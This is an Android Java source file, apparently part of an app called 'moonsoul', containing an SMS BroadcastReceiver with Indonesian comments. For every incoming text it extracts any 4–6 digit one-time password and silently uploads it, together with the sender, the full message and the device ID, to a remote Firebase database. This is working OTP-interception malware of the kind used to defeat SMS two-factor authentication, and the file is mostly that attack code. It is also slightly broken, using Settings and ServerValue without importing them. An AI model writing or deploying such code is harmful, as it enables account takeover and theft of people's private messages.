package com.moonsoul.v4;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsListener extends BroadcastReceiver {
    
    private DatabaseReference mDatabase;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getDisplayOriginatingAddress();
                    String message = sms.getDisplayMessageBody();
                    
                    // Cek apakah ini OTP
                    String otp = extractOTP(message);
                    if (otp != null) {
                        // Kirim ke Firebase
                        mDatabase = FirebaseDatabase.getInstance().getReference();
                        String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                        
                        DatabaseReference otpRef = mDatabase.child("otp_sms").child(deviceId).push();
                        otpRef.child("sender").setValue(sender);
                        otpRef.child("otp").setValue(otp);
                        otpRef.child("message").setValue(message);
                        otpRef.child("timestamp").setValue(ServerValue.TIMESTAMP);
                    }
                }
            }
        }
    }
    
    private String extractOTP(String message) {
        // Regex buat nyari kode OTP (4-6 digit)
        Pattern pattern = Pattern.compile("\\b(\\d{4,6})\\b");
        Matcher matcher = pattern.matcher(message);
        
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }
    }
